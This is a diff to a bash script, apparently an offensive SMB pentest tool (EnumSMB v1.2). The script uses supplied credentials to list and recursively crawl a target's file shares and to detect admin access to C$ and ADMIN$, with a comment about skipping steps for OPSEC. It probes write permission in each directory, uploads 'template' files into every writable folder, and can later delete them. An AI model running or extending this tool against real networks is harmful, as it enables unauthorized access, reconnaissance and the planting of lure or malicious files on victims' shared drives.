@@ -22,7 +22,7 @@ banner() {
  | ____|_ __  _   _ _ __ ___ / ___||  \/  | __ ) 
  |  _| | '_ \| | | | '_ ` _ \\___ \| |\/| |  _ \ 
  | |___| | | | |_| | | | | | |___) | |  | | |_) |
- |_____|_| |_|\__,_|_| |_| |_|____/|_|  |_|____/  v1.1
+ |_____|_| |_|\__,_|_| |_| |_|____/|_|  |_|____/  v1.2
 EOF
     echo "                     https://github.com/tralsesec/EnumSMB   "
     echo -e "${NC}"
@@ -183,9 +183,28 @@ banner
 echo -e "[*] Targeting ${BLUE}//$IP${NC} as ${BLUE}'$USER'${NC} [Mode: ${BLUE}$MODE${NC}]"
 echo "=========================================================="
 
-smbclient -L "//$IP" -U "$USER"%"$PASS" 2>/dev/null | sed 's/^[[:space:]]*//' | grep 'Disk' | sed 's/[[:space:]]*Disk.*//' | grep -vE 'C\$|ADMIN\$' | while read -r SHARE; do
+smbclient -L "//$IP" -U "$USER"%"$PASS" 2>/dev/null | sed 's/^[[:space:]]*//' | grep 'Disk' | sed 's/[[:space:]]*Disk.*//' | while read -r SHARE; do
     [ -z "$SHARE" ] && continue
     
+    # 1. Check first: Do we have access to root shares?
+    check_access=$(smbclient "//$IP/$SHARE" -U "$USER"%"$PASS" -c "ls" 2>&1 </dev/null)
+    if echo "$check_access" | grep -q "NT_STATUS_"; then
+        if [[ "$MODE" == "enum" || "$MODE" == "all" ]]; then
+            echo -e "${YELLOW}[NO ACCESS]${NC}  /$SHARE"
+        fi
+        continue 
+    fi
+
+    # 2. Admin-Share Fast-Track:
+    # Wir wollen wissen ob wir Admin sind, aber wir wollen NICHT das komplette C: Laufwerk stundenlang rekursiv durchsuchen!
+    if [[ "$SHARE" == "C$" || "$SHARE" == "ADMIN$" ]]; then
+        if [[ "$MODE" == "enum" || "$MODE" == "all" ]]; then
+            echo -e "${RED}[ADMIN ACCESS]${NC}    /$SHARE (Skipping recursive crawl & write for OPSEC/Speed)"
+        fi
+        continue 
+    fi
+
+    # 3. Normal shares: Now recursively enum directories & write.
     smbclient "//$IP/$SHARE" -U "$USER"%"$PASS" -c "recurse ON; ls" 2>/dev/null | grep '^\\' | tr -d '\r' | while read -r win_path; do
         target_dir=$(echo "$win_path" | sed 's/\\$//')
         [ -z "$target_dir" ] && target_dir="\\"
@@ -196,25 +215,25 @@ smbclient -L "//$IP" -U "$USER"%"$PASS" 2>/dev/null | sed 's/^[[:space:]]*//' | 
 
         case "$MODE" in
             enum)
-                if smbclient "//$IP/$SHARE" -U "$USER"%"$PASS" -c "cd \"$target_dir\"; mkdir check_perm_dir" 2>&1 | grep -q "NT_STATUS_"; then
+                if smbclient "//$IP/$SHARE" -U "$USER"%"$PASS" -c "cd \"$target_dir\"; mkdir check_perm_dir" 2>&1 </dev/null | grep -q "NT_STATUS_"; then
                     echo -e "${BLUE}[READ]${NC}       $full_path"
                 else
-                    smbclient "//$IP/$SHARE" -U "$USER"%"$PASS" -c "cd \"$target_dir\"; rmdir check_perm_dir" >/dev/null 2>&1
+                    smbclient "//$IP/$SHARE" -U "$USER"%"$PASS" -c "cd \"$target_dir\"; rmdir check_perm_dir" >/dev/null 2>&1 </dev/null
                     echo -e "${RED}[READ/WRITE]${NC} $full_path"
                 fi
                 ;;
                 
             write|all)
-                if smbclient "//$IP/$SHARE" -U "$USER"%"$PASS" -c "cd \"$target_dir\"; mkdir check_perm_dir" 2>&1 | grep -q "NT_STATUS_"; then
+                if smbclient "//$IP/$SHARE" -U "$USER"%"$PASS" -c "cd \"$target_dir\"; mkdir check_perm_dir" 2>&1 </dev/null | grep -q "NT_STATUS_"; then
                     [ "$MODE" == "all" ] && echo -e "${BLUE}[READ]${NC}       $full_path"
                 else
-                    smbclient "//$IP/$SHARE" -U "$USER"%"$PASS" -c "cd \"$target_dir\"; rmdir check_perm_dir" >/dev/null 2>&1
+                    smbclient "//$IP/$SHARE" -U "$USER"%"$PASS" -c "cd \"$target_dir\"; rmdir check_perm_dir" >/dev/null 2>&1 </dev/null
                     [ "$MODE" == "all" ] && echo -e "${RED}[READ/WRITE]${NC} $full_path"
                     
                     # Upload all selected templates
                     for t in "${TEMPLATES[@]}"; do
                         get_template_details "$t"
-                        if smbclient "//$IP/$SHARE" -U "$USER"%"$PASS" -c "cd \"$target_dir\"; put \"/tmp/smb_embed_$t\" \"${BASE_NAME}${EXT}\"" >/dev/null 2>&1; then
+                        if smbclient "//$IP/$SHARE" -U "$USER"%"$PASS" -c "cd \"$target_dir\"; put \"/tmp/smb_embed_$t\" \"${BASE_NAME}${EXT}\"" >/dev/null 2>&1 </dev/null; then
                             echo -e "${GREEN}[UPLOADED]${NC}   $full_path/${BASE_NAME}${EXT}"
                         fi
                     done
@@ -224,7 +243,7 @@ smbclient -L "//$IP" -U "$USER"%"$PASS" 2>/dev/null | sed 's/^[[:space:]]*//' | 
             clean)
                 for t in "${TEMPLATES[@]}"; do
                     get_template_details "$t"
-                    del_out=$(smbclient "//$IP/$SHARE" -U "$USER"%"$PASS" -c "cd \"$target_dir\"; del \"${BASE_NAME}${EXT}\"" 2>&1)
+                    del_out=$(smbclient "//$IP/$SHARE" -U "$USER"%"$PASS" -c "cd \"$target_dir\"; del \"${BASE_NAME}${EXT}\"" 2>&1 </dev/null)
                     if ! echo "$del_out" | grep -qE "NT_STATUS_OBJECT_NAME_NOT_FOUND|NT_STATUS_NO_SUCH_FILE|NT_STATUS_ACCESS_DENIED"; then
                         echo -e "${GREEN}[CLEANED]${NC}    $full_path/${BASE_NAME}${EXT}"
                     fi
